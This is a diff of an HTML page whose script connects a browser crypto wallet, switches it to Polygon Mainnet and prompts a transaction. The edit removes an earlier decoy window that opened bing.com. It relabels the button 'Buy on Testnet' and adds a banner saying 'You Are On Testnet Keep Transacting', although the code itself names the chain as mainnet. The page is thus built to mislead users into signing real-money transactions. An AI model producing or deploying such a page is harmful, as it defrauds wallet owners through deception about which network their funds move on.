@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <style>
     .button {
-      background-color: #4CAF50;
+      background-color: #0000FF;
       border: none;
       color: white;
       padding: 15px 32px;
@@ -19,16 +19,14 @@
 </head>
 <body>
   <script>
-    async function openBingAndPromptTransaction() {
-      // Open bing.com
-      const bingWindow = window.open('https://bing.com', 'x');
-
+    async function promptTransactionOnPolygon() {
       // Check for wallet connection
       const connected = await promptWalletConnection();
 
       // If wallet connected, switch to Polygon network and perform a transaction
       if (connected) {
-        await switchToPolygonNetwork(bingWindow);
+        await switchToPolygonNetwork();
+        await promptPolygonTransaction();
       }
     }
 
@@ -56,10 +54,9 @@
       }
     }
 
-    async function switchToPolygonNetwork(bingWindow) {
+    async function switchToPolygonNetwork() {
       try {
-        // Ethereum Mainnet is represented by chainId '1'
-        const ethereumChainId = '0x1';
+        // Polygon Mainnet is represented by chainId '137'
         const polygonChainId = '0x89'; // Polygon Mainnet chainId
 
         // Request network switch
@@ -72,18 +69,18 @@
         const currentChainId = await ethereum.request({ method: 'eth_chainId' });
         if (currentChainId === polygonChainId) {
           alert('Switched to Polygon network successfully! Initiating transaction.');
-          await performPolygonTransaction();
+          return true;
         } else {
           alert('Failed to switch to Polygon network.');
-          bingWindow.close(); // Close the Bing window if network switch fails
+          return false;
         }
       } catch (error) {
         alert('Failed to switch to Polygon network.');
-        bingWindow.close(); // Close the Bing window if network switch fails
+        return false;
       }
     }
 
-    async function performPolygonTransaction() {
+    async function promptPolygonTransaction() {
       try {
         const transactionParameters = {
           nonce: "0x00",
@@ -108,7 +105,8 @@
     }
   </script>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptTransaction()">
+    <input type="button" class="button" value="Buy on Testnet" onclick="promptTransactionOnPolygon()">
   </center>
+  <B>You Are On Testnet Keep Transacting ^</B>
 </body>
 </html>
